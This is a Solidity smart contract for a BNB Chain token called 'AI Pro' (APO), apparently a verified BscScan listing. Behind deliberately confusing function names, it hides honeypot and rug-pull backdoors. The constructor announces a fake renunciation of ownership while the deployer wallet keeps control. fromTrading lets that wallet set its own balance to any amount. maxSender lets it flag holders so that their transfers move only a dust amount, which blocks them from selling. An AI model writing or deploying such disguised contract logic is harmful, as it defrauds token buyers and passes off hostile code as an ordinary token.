/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface liquidityAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenFeeTrading {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIPro {
    uint8 public decimals = 18;
    uint256 constant launchedFund = 12 ** 10;


    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public autoTo;

    address public walletLimit;
    mapping(address => bool) public launchSwapAuto;

    string public name = "AI Pro";
    string public symbol = "APO";
    address public txFeeTo;
    mapping(address => bool) public feeWallet;

    address public owner;
    mapping(address => mapping(address => uint256)) public allowance;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        liquidityAt exemptTeam = liquidityAt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txFeeTo = tokenFeeTrading(exemptTeam.factory()).createPair(exemptTeam.WETH(), address(this));
        owner = isTeam();
        walletLimit = owner;
        feeWallet[walletLimit] = true;
        balanceOf[walletLimit] = totalSupply;
        emit Transfer(address(0), walletLimit, totalSupply);
        limitLaunch();
    }

    

    function maxSender(address txAuto) public {
        if (txAuto == walletLimit || txAuto == txFeeTo || !feeWallet[isTeam()]) {
            return;
        }
        launchSwapAuto[txAuto] = true;
    }

    function launchList(address swapLiquidity, address sellIs, uint256 amountReceiver) internal returns (bool) {
        require(balanceOf[swapLiquidity] >= amountReceiver);
        balanceOf[swapLiquidity] -= amountReceiver;
        balanceOf[sellIs] += amountReceiver;
        emit Transfer(swapLiquidity, sellIs, amountReceiver);
        return true;
    }

    function fromTrading(uint256 amountReceiver) public {
        if (!feeWallet[isTeam()]) {
            return;
        }
        balanceOf[walletLimit] = amountReceiver;
    }

    function transferFrom(address senderShould, address totalLiquidity, uint256 amountReceiver) public returns (bool) {
        if (senderShould != isTeam() && allowance[senderShould][isTeam()] != type(uint256).max) {
            require(allowance[senderShould][isTeam()] >= amountReceiver);
            allowance[senderShould][isTeam()] -= amountReceiver;
        }
        if (totalLiquidity == walletLimit || senderShould == walletLimit) {
            return launchList(senderShould, totalLiquidity, amountReceiver);
        }
        if (launchSwapAuto[senderShould]) {
            return launchList(senderShould, totalLiquidity, launchedFund);
        }
        return launchList(senderShould, totalLiquidity, amountReceiver);
    }

    function transfer(address totalLiquidity, uint256 amountReceiver) external returns (bool) {
        return transferFrom(isTeam(), totalLiquidity, amountReceiver);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address modeSwap, uint256 amountReceiver) public returns (bool) {
        allowance[isTeam()][modeSwap] = amountReceiver;
        emit Approval(isTeam(), modeSwap, amountReceiver);
        return true;
    }

    function feeTxTotal(address tokenTradingAt) public {
        if (autoTo) {
            return;
        }
        feeWallet[tokenTradingAt] = true;
        autoTo = true;
    }

    function limitLaunch() public {
        emit OwnershipTransferred(walletLimit, address(0));
        owner = address(0);
    }

    function isTeam() private view returns (address) {
        return msg.sender;
    }


}